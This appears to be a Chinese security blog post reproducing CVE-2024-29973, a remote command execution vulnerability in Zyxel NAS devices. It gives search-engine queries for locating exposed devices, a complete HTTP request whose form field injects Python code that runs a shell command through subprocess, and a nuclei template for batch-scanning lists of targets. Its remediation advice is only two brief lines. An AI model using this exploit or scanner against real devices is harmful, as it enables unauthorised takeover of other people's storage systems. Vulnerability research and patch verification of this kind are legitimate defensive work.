#  【漏洞复现 | 含批量POC】Zyxel-NAS设备 setCookie 远程命令执行漏洞   
小明同学  小明信安   2024-06-23 14:11  
  
**0x01 免责声明**  
  
disclaimer  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。信息及工具收集于互联网，真实性及安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
**0x02 漏洞介绍**  
  
Vulnerability introduction  
  
       
Zyxel-NAS设备/cmd,/simZysh/register_main/setCookie  
接口存在任意命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。  
  
        CVE编号：CVE-2024-29973  
  
**0x03 搜索语法**  
  
Search for syntax  
  
- Fofa：  
  
  
```
body="/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo"
```  
  
- Hunter  
  
  
```
body="/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo"
```  
  
- Quake  
  
  
```
body="/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSI4UQBUiayqBlv7nC0Uic3Vd6eO7Kw2uzqrtUd1R61ZYALibMNzialibX6TNkcpIh9Ju6z37WITMGjH6Jg/640?wx_fmt=png&from=appmsg "")  
  
**0x04 漏洞复现**  
  
Request packets  
  
- 请求接口执行任意命令  
  
```
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
 
------WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="c0"
 
storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
------WebKitFormBoundaryHHaZAYecVOf5sfa6--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSI4UQBUiayqBlv7nC0Uic3Vd6PlpdEPuqEiamTkT9aJJ85ojRyS2JsDxxRkIF5j7zbTkZYwMNnUqVR8g/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 nuclei POC**  
  
nuclei POC  
  
- Nuclei 批量检测POC  
  
- 所用方法nuclei.exe -l 网址文件.txt -t POC.yaml  
  
```
id: Zyxel-NAS_setCookie_RCE

info:
  name: Zyxel-NAS_setCookie_RCE
  author: security-xm
  severity: high
  description: Zyxel-NAS设备 setCookie 远程命令执行漏洞 (CVE-2024-29973)
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
    Content-Length: 240

    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
    Content-Disposition: form-data; name="c0"
    
    storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
    ------WebKitFormBoundaryHHaZAYecVOf5sfa6--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - uid

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSI4UQBUiayqBlv7nC0Uic3Vd6qDiaf6w6EE1wtiabibgf7FO0DhnOMibWVia7PmibAHOiaE5jAw4Or2yH9fQfg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x07 修复建议**  
  
Remediation recommendations  
  
- 在Web应用防火墙中添加接口临时黑名单规则  
  
- 联系厂商打补丁或升级版本。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/WfB6o4vicwSISMoBvibVByMUlExr9ibqmnwWAbwiaNjO1XPzIHNbfEIfgfSHeJqDSHqIw8pXKSdgic1vSia8HhntX5lw/640?wx_fmt=gif&from=appmsg "")  
  
  
